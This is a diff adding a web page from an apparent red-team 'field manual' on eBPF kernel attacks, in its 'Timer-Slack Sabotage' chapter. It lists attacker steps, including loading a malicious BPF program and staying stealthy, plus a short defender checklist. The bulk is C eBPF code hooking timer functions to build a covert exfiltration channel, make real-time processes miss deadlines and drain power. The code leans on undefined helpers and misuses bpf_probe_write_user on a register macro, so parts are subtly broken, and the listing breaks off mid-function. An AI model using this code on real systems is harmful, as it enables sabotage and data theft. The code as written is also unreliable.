@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Timer‑Slack Sabotage | Diabolical eBPF: Linux Red Team Field Manual</title>
+    <meta name="description" content="100 kernel-hacking micro-chapters proving eBPF is all you need.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+<link rel="stylesheet" href="/dBPF/assets/css/book.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: 'dark'
+    });
+  });
+</script>
+
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Timer‑Slack Sabotage | Diabolical eBPF: Linux Red Team Field Manual</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Timer‑Slack Sabotage" />
+<meta name="author" content="Diabolical eBPF" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Timer-Slack Sabotage: Manipulating Kernel Timing Mechanisms" />
+<meta property="og:description" content="Timer-Slack Sabotage: Manipulating Kernel Timing Mechanisms" />
+<link rel="canonical" href="https://mbhatt1.github.io/dBPF/timer-slack-sabotage.html" />
+<meta property="og:url" content="https://mbhatt1.github.io/dBPF/timer-slack-sabotage.html" />
+<meta property="og:site_name" content="Diabolical eBPF: Linux Red Team Field Manual" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-02-12T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Timer‑Slack Sabotage" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Diabolical eBPF"},"dateModified":"2025-02-12T00:00:00+00:00","datePublished":"2025-02-12T00:00:00+00:00","description":"Timer-Slack Sabotage: Manipulating Kernel Timing Mechanisms","headline":"Timer‑Slack Sabotage","mainEntityOfPage":{"@type":"WebPage","@id":"https://mbhatt1.github.io/dBPF/timer-slack-sabotage.html"},"url":"https://mbhatt1.github.io/dBPF/timer-slack-sabotage.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+    <div class="layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/dBPF/" class="site-title">Diabolical eBPF: Linux Red Team Field Manual</a>
+            </div>
+            <div class="sidebar-content">
+                
+                
+                    <a href="/dBPF/the-mirror-controls.html" >
+                        The Mirror Controls
+                    </a>
+                
+                    <a href="/dBPF/the-overlayfs-trojan-horse.html" >
+                        The OverlayFS Trojan Horse
+                    </a>
+                
+                    <a href="/dBPF/the-fuse-audit-black-hole.html" >
+                        The FUSE Audit Black‑Hole
+                    </a>
+                
+                    <a href="/dBPF/the-phantom-syscall.html" >
+                        The Phantom Syscall
+                    </a>
+                
+                    <a href="/dBPF/the-ghost-nic.html" >
+                        The Ghost NIC
+                    </a>
+                
+                    <a href="/dBPF/slipping-the-cgroup-leash.html" >
+                        Slipping the Cgroup Leash
+                    </a>
+                
+                    <a href="/dBPF/silencing-selinux.html" >
+                        Silencing SELinux
+                    </a>
+                
+                    <a href="/dBPF/device-cgroup-houdini.html" >
+                        Device‑cgroup Houdini
+                    </a>
+                
+                    <a href="/dBPF/keyring-heist.html" >
+                        Keyring Heist
+                    </a>
+                
+                    <a href="/dBPF/pid-namespace-doppelg-nger.html" >
+                        PID Namespace Doppelgänger
+                    </a>
+                
+                    <a href="/dBPF/inode-cloak.html" >
+                        Inode Cloak
+                    </a>
+                
+                    <a href="/dBPF/irq-affinity-chaos.html" >
+                        IRQ Affinity Chaos
+                    </a>
+                
+                    <a href="/dBPF/timer-slack-sabotage.html" class="active">
+                        Timer‑Slack Sabotage
+                    </a>
+                
+                    <a href="/dBPF/kernel-event-loop-hijack.html" >
+                        Kernel Event Loop Hijack
+                    </a>
+                
+                    <a href="/dBPF/mount-options-flip.html" >
+                        Mount‑Options Flip
+                    </a>
+                
+                    <a href="/dBPF/hidden-host-device-injection.html" >
+                        Hidden Host Device Injection
+                    </a>
+                
+                    <a href="/dBPF/userfaultfd-escape.html" >
+                        Userfaultfd Escape
+                    </a>
+                
+                    <a href="/dBPF/blkio-phantom-writes.html" >
+                        blkio Phantom Writes
+                    </a>
+                
+                    <a href="/dBPF/netlink-blindspot.html" >
+                        Netlink Blindspot
+                    </a>
+                
+                    <a href="/dBPF/stack-trace-scrubber.html" >
+                        Stack Trace Scrubber
+                    </a>
+                
+                    <a href="/dBPF/kprobe-kill-switch.html" >
+                        Kprobe Kill‑Switch
+                    </a>
+                
+                    <a href="/dBPF/bpf-rootkit-resurrection.html" >
+                        BPF Rootkit Resurrection
+                    </a>
+                
+                    <a href="/dBPF/uaf-cache-reheat.html" >
+                        UAF Cache Reheat
+                    </a>
+                
+                    <a href="/dBPF/transparent-hugepage-trap.html" >
+                        Transparent Hugepage Trap
+                    </a>
+                
+                    <a href="/dBPF/ebpf-nftables-side-door.html" >
+                        eBPF + nftables Side‑Door
+                    </a>
+                
+                    <a href="/dBPF/dns-rebind-wizard.html" >
+                        DNS Rebind Wizard
+                    </a>
+                
+                    <a href="/dBPF/tcp-window-whisper.html" >
+                        TCP Window Whisper
+                    </a>
+                
+                    <a href="/dBPF/rdma-sneak-path.html" >
+                        RDMA Sneak‑path
+                    </a>
+                
+                    <a href="/dBPF/pci-hotplug-phantom.html" >
+                        PCI Hotplug Phantom
+                    </a>
+                
+                    <a href="/dBPF/ebpf-signed-driver-swap.html" >
+                        eBPF Signed‑Driver Swap
+                    </a>
+                
+                    <a href="/dBPF/kexec-quiet-launch.html" >
+                        Kexec Quiet Launch
+                    </a>
+                
+                    <a href="/dBPF/crash-dump-key-leak.html" >
+                        Crash‑dump Key Leak
+                    </a>
+                
+                    <a href="/dBPF/efi-var-ghost.html" >
+                        EFI Var Ghost
+                    </a>
+                
+                    <a href="/dBPF/spectre-gadget-amplifier.html" >
+                        Spectre Gadget Amplifier
+                    </a>
+                
+                    <a href="/dBPF/avx-frequency-dos.html" >
+                        AVX Frequency DoS
+                    </a>
+                
+                    <a href="/dBPF/gpu-memory-exfil.html" >
+                        GPU Memory Exfil
+                    </a>
+                
+                    <a href="/dBPF/hpe-ilo-packet-ride.html" >
+                        HPE ILO Packet Ride
+                    </a>
+                
+                    <a href="/dBPF/numa-node-eviction.html" >
+                        NUMA Node Eviction
+                    </a>
+                
+                    <a href="/dBPF/powercap-override.html" >
+                        Powercap Override
+                    </a>
+                
+                    <a href="/dBPF/thermal-trip-faker.html" >
+                        Thermal Trip Faker
+                    </a>
+                
+                    <a href="/dBPF/energy-meter-spoof.html" >
+                        Energy Meter Spoof
+                    </a>
+                
+                    <a href="/dBPF/ras-event-flood.html" >
+                        RAS Event Flood
+                    </a>
+                
+                    <a href="/dBPF/iommu-map-slip.html" >
+                        IOMMU Map Slip
+                    </a>
+                
+                    <a href="/dBPF/sched-fifo-impersonator.html" >
+                        SCHED_FIFO Impersonator
+                    </a>
+                
+                    <a href="/dBPF/ksm-cross-vm-peek.html" >
+                        KSM Cross‑VM Peek
+                    </a>
+                
+                    <a href="/dBPF/perf-ring-flood.html" >
+                        Perf Ring Flood
+                    </a>
+                
+                    <a href="/dBPF/ebpf-ptrace-duo.html" >
+                        EBPF + ptrace Duo
+                    </a>
+                
+                    <a href="/dBPF/page-table-spray.html" >
+                        Page Table Spray
+                    </a>
+                
+                    <a href="/dBPF/dma-buf-relay.html" >
+                        DMA‑Buf Relay
+                    </a>
+                
+                    <a href="/dBPF/sysrq-shadow.html" >
+                        Sysrq Shadow
+                    </a>
+                
+                    <a href="/dBPF/ftrace-backdoor.html" >
+                        ftrace Backdoor
+                    </a>
+                
+                    <a href="/dBPF/time-namespace-warp.html" >
+                        Time‑Namespace Warp
+                    </a>
+                
+                    <a href="/dBPF/sid-swap-every-tick.html" >
+                        SID Swap Every Tick
+                    </a>
+                
+                    <a href="/dBPF/seccomp-notify-storm.html" >
+                        SECCOMP Notify Storm
+                    </a>
+                
+                    <a href="/dBPF/bpf-lsm-toggle.html" >
+                        BPF LSM Toggle
+                    </a>
+                
+                    <a href="/dBPF/bpf-map-dead-drop.html" >
+                        BPF Map Dead‑Drop
+                    </a>
+                
+                    <a href="/dBPF/veth-mac-masquerade.html" >
+                        Veth MAC Masquerade
+                    </a>
+                
+                    <a href="/dBPF/xfrm-policy-eraser.html" >
+                        XFRM Policy Eraser
+                    </a>
+                
+                    <a href="/dBPF/ipv6-ra-surprise.html" >
+                        IPv6 RA Surprise
+                    </a>
+                
+                    <a href="/dBPF/ebpf-bpf-lsm-lockout.html" >
+                        eBPF + BPF LSM Lockout
+                    </a>
+                
+                    <a href="/dBPF/io-uring-double-dip.html" >
+                        IO_uring Double Dip
+                    </a>
+                
+                    <a href="/dBPF/swap-off-bomb.html" >
+                        Swap‑off Bomb
+                    </a>
+                
+                    <a href="/dBPF/md-raid-fake-event.html" >
+                        md‑raid Fake Event
+                    </a>
+                
+                    <a href="/dBPF/crypto-api-overlay.html" >
+                        crypto API Overlay
+                    </a>
+                
+                    <a href="/dBPF/nfqueue-siphon.html" >
+                        NFqueue Siphon
+                    </a>
+                
+                    <a href="/dBPF/rseq-side-switch.html" >
+                        RSeq Side‑Switch
+                    </a>
+                
+                    <a href="/dBPF/vmsplice-burst.html" >
+                        vmsplice Burst
+                    </a>
+                
+                    <a href="/dBPF/bpf-prog-array-chain.html" >
+                        BPF Prog‑Array Chain
+                    </a>
+                
+                    <a href="/dBPF/task-work-hijack.html" >
+                        task_work Hijack
+                    </a>
+                
+                    <a href="/dBPF/bpf-lsm-fanotify-spy.html" >
+                        BPF Lsm + Fanotify Spy
+                    </a>
+                
+                    <a href="/dBPF/hid-gadget-relay.html" >
+                        HID Gadget Relay
+                    </a>
+                
+                    <a href="/dBPF/usbip-packet-morph.html" >
+                        USBIP Packet Morph
+                    </a>
+                
+                    <a href="/dBPF/ebpftrace-ghost.html" >
+                        ebpftrace Ghost
+                    </a>
+                
+                    <a href="/dBPF/socket-cookie-clash.html" >
+                        Socket Cookie Clash
+                    </a>
+                
+                    <a href="/dBPF/netns-vlan-ghost.html" >
+                        NetNS VLAN Ghost
+                    </a>
+                
+                    <a href="/dBPF/mount-setattr-shuffle.html" >
+                        mount_setattr Shuffle
+                    </a>
+                
+                    <a href="/dBPF/selinux-netlabel-null.html" >
+                        SELinux Netlabel Null
+                    </a>
+                
+                    <a href="/dBPF/overlayfs-index-misdirect.html" >
+                        OverlayFS Index Misdirect
+                    </a>
+                
+                    <a href="/dBPF/ioctl-reply-forgery.html" >
+                        ioctl Reply Forgery
+                    </a>
+                
+                    <a href="/dBPF/seccomp-tid-hop.html" >
+                        Seccomp TID Hop
+                    </a>
+                
+                    <a href="/dBPF/process-mprotect-piggyback.html" >
+                        process_mprotect Piggyback
+                    </a>
+                
+                    <a href="/dBPF/bpf-jit-spray.html" >
+                        BPF JIT Spray
+                    </a>
+                
+                    <a href="/dBPF/ebpf-kfunc-abuse.html" >
+                        ebpf_kfunc Abuse
+                    </a>
+                
+                    <a href="/dBPF/printk-mute-switch.html" >
+                        printk Mute Switch
+                    </a>
+                
+                    <a href="/dBPF/pmu-counter-jam.html" >
+                        PMU Counter Jam
+                    </a>
+                
+                    <a href="/dBPF/ebpf-kernel-exec.html" >
+                        EBPF kernel_exec
+                    </a>
+                
+                    <a href="/dBPF/binder-parcel-peek.html" >
+                        binder Parcel Peek
+                    </a>
+                
+                    <a href="/dBPF/ashmem-snooper.html" >
+                        ashmem Snooper
+                    </a>
+                
+                    <a href="/dBPF/fuse-deadlock-dos.html" >
+                        FUSE Deadlock DoS
+                    </a>
+                
+                    <a href="/dBPF/ebpf-cgroup-sock-release.html" >
+                        EBPF-Cgroup Sock Release
+                    </a>
+                
+                    <a href="/dBPF/kfence-leak.html" >
+                        KFENCE Leak
+                    </a>
+                
+                    <a href="/dBPF/pstore-silent-drop.html" >
+                        pstore Silent Drop
+                    </a>
+                
+                    <a href="/dBPF/audit-trigger-smother.html" >
+                        audit_trigger Smother
+                    </a>
+                
+                    <a href="/dBPF/taskstats-leak.html" >
+                        taskstats Leak
+                    </a>
+                
+                    <a href="/dBPF/videobuf-shadow.html" >
+                        VIDEOBUF Shadow
+                    </a>
+                
+                    <a href="/dBPF/mmu-notifier-detour.html" >
+                        mmu_notifier Detour
+                    </a>
+                
+                    <a href="/dBPF/acpi-wsmi-ping.html" >
+                        ACPI WSMI Ping
+                    </a>
+                
+                    <a href="/dBPF/netfilter-log-rewriter.html" >
+                        netfilter Log Rewriter
+                    </a>
+                
+                    <a href="/dBPF/ebpf-token-bypass.html" >
+                        EBPF Token Bypass
+                    </a>
+                
+            </div>
+        </nav>
+
+        <div class="content-wrapper">
+            <main class="content">
+                <article class="post">
+                    <header class="post-header">
+                        <h1 class="post-title">Timer‑Slack Sabotage</h1>
+                        
+                        <time class="post-date" datetime="2025-02-12T00:00:00+00:00">
+                            February 12, 2025
+                        </time>
+                        
+                    </header>
+
+                    <div class="post-content">
+                        <h1 id="timer-slack-sabotage-manipulating-kernel-timing-mechanisms">Timer-Slack Sabotage: Manipulating Kernel Timing Mechanisms</h1>
+
+<p><strong>Wut</strong></p>
+
+<p>A technique that uses eBPF to manipulate kernel timer slack values, allowing attackers to disrupt timing-sensitive operations, create covert timing channels, and undermine performance isolation. This sabotage affects power management, scheduling fairness, and can enable side-channel attacks.</p>
+
+<pre><code class="language-mermaid">graph TD
+    A[Process Timer] --&gt;|1. Schedule| B[Timer Subsystem]
+    B --&gt;|2. Apply Slack| C[Timer Execution]
+    D[eBPF Program] --&gt;|3. Hook &amp; Manipulate| B
+    D --&gt;|4. Modify Slack Values| E[Altered Timing]
+    F[Power Management] --&gt;|5. Affected| G[Battery Drain]
+    H[Real-time Process] --&gt;|6. Delayed| I[Missed Deadlines]
+    J[Timing Channel] --&gt;|7. Covert Communication| K[Data Exfiltration]
+</code></pre>
+
+<p><strong>Why</strong></p>
+
+<p>Because eBPF + misconfiguration =&gt; broken isolation. Timer slack is a kernel mechanism that allows the system to coalesce timers to improve power efficiency. By manipulating these values through eBPF, attackers can disrupt timing guarantees, create covert channels for data exfiltration, and undermine performance isolation between processes or containers.</p>
+
+<p><strong>POC</strong></p>
+
+<p><em>Coming soon.</em></p>
+
+<p>The proof of concept will demonstrate:</p>
+<ul>
+  <li>Hooking into kernel timer management functions</li>
+  <li>Dynamically manipulating timer slack values for targeted processes</li>
+  <li>Creating covert timing channels for data exfiltration</li>
+  <li>Disrupting real-time processing guarantees</li>
+  <li>Causing excessive power consumption through timer manipulation</li>
+  <li>Bypassing container resource limits through timing attacks</li>
+</ul>
+
+<p><strong>Attacker hat on</strong></p>
+
+<ol>
+  <li>Identify a target system with eBPF capabilities and timing-sensitive workloads</li>
+  <li>Map the kernel functions responsible for timer management</li>
+  <li>Develop an eBPF program that hooks into these functions</li>
+  <li>Load the malicious BPF program with appropriate privileges</li>
+  <li>Manipulate timer slack values for specific processes or containers</li>
+  <li>Implement covert channels using timer manipulation for data exfiltration</li>
+  <li>Target real-time processes to cause missed deadlines</li>
+  <li>Maintain stealth by making timing issues appear non-malicious</li>
+</ol>
+
+<p><strong>Defender hat on</strong></p>
+
+<ol>
+  <li>Remove CAP_BPF from untrusted processes and containers</li>
+  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
+  <li>Monitor for unexpected changes to timer slack values</li>
+  <li>Implement strict isolation for timing-sensitive workloads</li>
+  <li>Use hardware-level timers for critical operations</li>
+  <li>Consider using eBPF-based security tools that can detect malicious eBPF usage</li>
+</ol>
+
+<p><strong>Conclusion</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to manipulate kernel timer mechanisms through eBPF creates a powerful primitive for disrupting system behavior and establishing covert channels. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls, especially in environments with timing-sensitive workloads.</p>
+
+<h2 id="technical-details">Technical Details</h2>
+
+<h3 id="timer-subsystem-architecture">Timer Subsystem Architecture</h3>
+
+<p>The Linux kernel timer subsystem consists of:</p>
+<ul>
+  <li><strong>High-Resolution Timers</strong>: Precise timing mechanisms for kernel operations</li>
+  <li><strong>Timer Slack</strong>: Mechanism to coalesce timers for power efficiency</li>
+  <li><strong>Timer Wheel</strong>: Data structure for managing scheduled timers</li>
+  <li><strong>Per-Process Timer Settings</strong>: Including the <code class="language-plaintext highlighter-rouge">prctl(PR_SET_TIMERSLACK)</code> interface</li>
+  <li><strong>Timer Callbacks</strong>: Functions executed when timers expire</li>
+</ul>
+
+<p>Timer slack allows the kernel to delay timer execution slightly to batch operations and reduce CPU wakeups, improving power efficiency.</p>
+
+<h3 id="exploitation-technique">Exploitation Technique</h3>
+
+<p>The exploit leverages eBPF’s ability to attach to kernel functions that implement timer management. By intercepting these calls, an attacker can:</p>
+
+<ol>
+  <li><strong>Hook timer functions</strong>: Attach to functions like <code class="language-plaintext highlighter-rouge">schedule_hrtimeout_range()</code> or <code class="language-plaintext highlighter-rouge">timer_slack_set()</code></li>
+  <li><strong>Manipulate slack values</strong>: Modify the slack parameters for specific processes</li>
+  <li><strong>Create timing channels</strong>: Use controlled timer delays for covert communication</li>
+  <li><strong>Disrupt real-time processing</strong>: Cause missed deadlines for time-sensitive operations</li>
+  <li><strong>Affect power management</strong>: Force excessive CPU wakeups through timer manipulation</li>
+</ol>
+
+<h3 id="code-snippet">Code Snippet</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+</pre></td><td class="rouge-code"><pre><span class="c1">// Simplified eBPF program to manipulate timer slack</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/schedule_hrtimeout_range"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_hrtimeout</span><span class="p">,</span> <span class="n">ktime_t</span> <span class="o">*</span><span class="n">expires</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">delta</span><span class="p">,</span>
+               <span class="k">const</span> <span class="k">enum</span> <span class="n">hrtimer_mode</span> <span class="n">mode</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Get process information</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="c1">// Check if this is a process we want to target</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// For covert channel implementation</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">should_use_covert_channel</span><span class="p">())</span> <span class="p">{</span>
+            <span class="c1">// Modify the delta (slack) value based on the bit we want to transmit</span>
+            <span class="c1">// This creates a timing side-channel</span>
+            <span class="n">u64</span> <span class="n">bit_to_send</span> <span class="o">=</span> <span class="n">get_next_covert_bit</span><span class="p">();</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">bit_to_send</span><span class="p">)</span> <span class="p">{</span>
+                <span class="c1">// Increase slack for '1' bit</span>
+                <span class="n">delta</span> <span class="o">=</span> <span class="n">MAX_SLACK_VALUE</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="c1">// Decrease slack for '0' bit</span>
+                <span class="n">delta</span> <span class="o">=</span> <span class="n">MIN_SLACK_VALUE</span><span class="p">;</span>
+            <span class="p">}</span>
+            
+            <span class="c1">// Update the delta parameter</span>
+            <span class="n">bpf_probe_write_user</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">PT_REGS_PARM2</span><span class="p">(</span><span class="n">ctx</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">delta</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">delta</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="c1">// For real-time disruption</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">should_disrupt_timing</span><span class="p">())</span> <span class="p">{</span>
+            <span class="c1">// Set maximum slack to cause missed deadlines</span>
+            <span class="n">delta</span> <span class="o">=</span> <span class="n">MAX_SLACK_VALUE</span><span class="p">;</span>
+            <span class="n">bpf_probe_write_user</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">PT_REGS_PARM2</span><span class="p">(</span><span class="n">ctx</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">delta</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">delta</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="c1">// For power management disruption</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">should_drain_power</span><span class="p">())</span> <span class="p">{</span>
+            <span class="c1">// Set minimum slack to cause frequent CPU wakeups</span>
+            <span class="n">delta</span> <span class="o">=</span> <span class="n">MIN_SLACK_VALUE</span><span class="p">;</span>
+            <span class="n">bpf_probe_write_user</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">PT_REGS_PARM2</span><span class="p">(</span><span class="n">ctx</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">delta</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">delta</span><span class="p">));</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook the timer slack setting function</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/timerslack_ns_write"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_timerslack_set</span><span class="p">,</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">slack</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Get process information</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">task</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">;</span>
+    
+    <span class="c1">// Check if this is a process we want to target</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Modify the slack value</span>
+        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">modified_slack</span><span class="p">;</span>
+        
+        <span class="k">if</span> <span class="p">(</span><span class="n">should_disrupt_timing</span><span class="p">())</span> <span class="p">{</span>
+            <span class="c1">// Set very high slack for timing disruption</span>
+            <span class="n">modified_slack</span> <span class="o">=</span> <span class="n">MAX_SLACK_VALUE</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="c1">// Set very low slack for power drain</span>
+            <span class="n">modified_slack</span> <span class="o">=</span> <span class="n">MIN_SLACK_VALUE</span><span class="p">;</span>
+        <span class="p">}</span>
+        
+        <span class="c1">// Update the slack parameter</span>
+        <span class="n">bpf_probe_write_user</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">PT_REGS_PARM2</span><span class="p">(</span><span class="n">ctx</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">modified_slack</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">modified_slack</span><span class="p">));</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Implement a receiver for the covert channel</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/hrtimer_nanosleep"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_nanosleep</span><span class="p">,</span> <span class="k">struct</span> <span class="n">hrtimer_sleeper</span> <span class="o">*</span><span class="n">t</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Get the requested sleep time</span>
+    <span class="k">struct</span> <span class="n">timespec64</span> <span class="n">requested_time</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">requested_time</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">requested_time</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">node</span><span class="p">.</span><span class="n">expires</span><span class="p">);</span>
+    
+    <span class="c1">// Get the actual start time</span>
+    <span class="n">u64</span> <span class="n">start_time</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+    
+    <span class="c1">// Store the start time for this sleep</span>
+    <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sleep_timing_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">start_time</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Measure the actual sleep time to decode the covert channel</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kretprobe/hrtimer_nanosleep"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KRETPROBE</span><span class="p">(</span><span class="n">hook_nanosleep_ret</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Get the end time</span>
+    <span class="n">u64</span> <span class="n">end_time</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+    
+    <span class="c1">// Look up the start time</span>
+    <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="o">*</span><span class="n">start_time</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sleep_timing_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">start_time</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Calculate actual sleep duration</span>
+        <span class="n">u64</span> <span class="n">duration</span> <span class="o">=</span> <span class="n">end_time</span> <span class="o">-</span> <span class="o">*</span><span class="n">start_time</span><span class="p">;</span>
+        
+        <span class="c1">// Decode the bit based on the actual sleep time</span>
+        <span class="c1">// If the sleep took longer than expected, it's a '1' bit</span>
+        <span class="c1">// Otherwise, it's a '0' bit</span>
+        <span class="n">u32</span> <span class="n">threshold</span> <span class="o">=</span> <span class="n">COVERT_CHANNEL_THRESHOLD</span><span class="p">;</span>
+        <span class="n">u32</span> <span class="n">decoded_bit</span> <span class="o">=</span> <span class="p">(</span><span class="n">duration</span> <span class="o">&gt;</span> <span class="n">threshold</span><span class="p">)</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+        
+        <span class="c1">// Store the decoded bit</span>
+        <span class="k">struct</span> <span class="n">covert_data</span> <span class="n">cdata</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+        <span class="n">cdata</span><span class="p">.</span><span class="n">bit</span> <span class="o">=</span> <span class="n">decoded_bit</span><span class="p">;</span>
+        <span class="n">cdata</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">end_time</span><span class="p">;</span>
+        
+        <span class="n">u32</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">get_next_bit_index</span><span class="p">();</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">covert_channel_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cdata</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+    <span class="p">}</span>
+    
